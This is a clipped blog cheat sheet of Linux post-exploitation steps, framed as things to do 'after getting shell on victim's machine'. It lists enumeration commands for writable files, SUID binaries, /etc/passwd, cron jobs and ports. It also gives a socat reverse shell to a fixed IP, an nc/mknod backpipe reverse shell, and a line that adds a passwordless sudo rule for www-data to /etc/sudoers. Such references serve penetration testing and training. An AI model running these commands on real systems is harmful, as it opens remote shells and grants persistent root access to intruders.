<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-13 12:52:50 +0000"/><meta name="source" content="Clearly"/><meta name="source-url" content="https://hrushikeshk.github.io/blog/2017/12/30/linux-enumeration-cheatsheet/"/><meta name="updated" content="2018-01-13 12:52:50 +0000"/><title>Linux Enumeration</title></head><body><div style="-evernote-webclip:true"><br/><div><div><div><div><h1> Linux Enumeration ∞ </h1><div><div/></div></div>
  
    
      cheatsheets
    
  
  <div>
    
      30 Dec 2017
    
    
  </div>
  <div>
		
    <h4>Things to do after getting shell on victim’s machine<a href="https://hrushikeshk.github.io/blog/2017/12/30/linux-enumeration-cheatsheet/#things-to-do-after-getting-shell-on-victims-machine" title="Permalink" target="_blank">Permalink</a></h4>

<ul>
  <li>Find World Writable Folders
    <div>
<div><pre><code>find / -xdev -type d -perm -0002 -ls 2&gt; /dev/null
</code></pre></div>    </div>
  </li>
  <li>Find World Writable Files
    <div>
<div><pre><code>find / -xdev -type f -perm -0002 -ls 2&gt; /dev/null
</code></pre></div>    </div>
  </li>
  <li>Find SUIDs
    <div>
<div><pre><code>find / -perm -4000 -user root -exec ls -ld {} \; 2&gt; /dev/null
</code></pre></div>    </div>
  </li>
  <li>DIstro Information
    <div>
<div><pre><code>cat /etc/*-release
</code></pre></div>    </div>
  </li>
  <li>Check open ports
    <div>
<div><pre><code>netstat -antup
</code></pre></div>    </div>
  </li>
  <li>Check for sudo permissions
    <div>
<div><pre><code>sudo -l
</code></pre></div>    </div>
  </li>
  <li>Check OS architecture
    <div>
<div><pre><code>uname -a
</code></pre></div>    </div>
  </li>
  <li>Check cronjobs
    <div>
<div><pre><code>cat /etc/cron*
</code></pre></div>    </div>
  </li>
  <li>Check network configuration
    <div>
<div><pre><code>ip addr
</code></pre></div>    </div>
  </li>
  <li>Check contents of <strong>/etc/passwd</strong>
    <div>
<div><pre><code>cat /etc/passwd
</code></pre></div>    </div>
  </li>
  <li>Using <strong>socat</strong>
    <ul>
      <li>Listen
        <div>
<div><pre><code>  $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
</code></pre></div>        </div>
      </li>
      <li>Connect
        <div>
<div><pre><code>  $ socat file:`tty`,raw,echo=0 tcp-listen:4444
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Reverse connection using mknod
    <div>
<div><pre><code>mknod /tmp/backpipe p; /bin/sh 0&lt; /tmp/backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt; /tmp/backpipe; rm /tmp/backpipe
</code></pre></div>    </div>
  </li>
  <li>Check version of an installed application
    <div>
<div><pre><code>dpkg -l &lt;application name&gt;
</code></pre></div>    </div>
  </li>
  <li>
    <p>Sometimes checking <code>/opt</code> <code>/tmp</code> <code>/var</code> <code>/usr</code> might help.</p>
  </li>
  <li>Edit <strong>sudoers</strong> file and grant sudo access to the current user (www-data in this case) with no password
    <div>
<div><pre><code>echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers
</code></pre></div>    </div>
  </li>
</ul>

<hr/>
<h4>Resources<a href="https://hrushikeshk.github.io/blog/2017/12/30/linux-enumeration-cheatsheet/#resources" title="Permalink" target="_blank">Permalink</a></h4>


<div>
    <h2>Share the fun!</h2>

    
</div>

  </div>
</div></div></div><br/></div></body></html>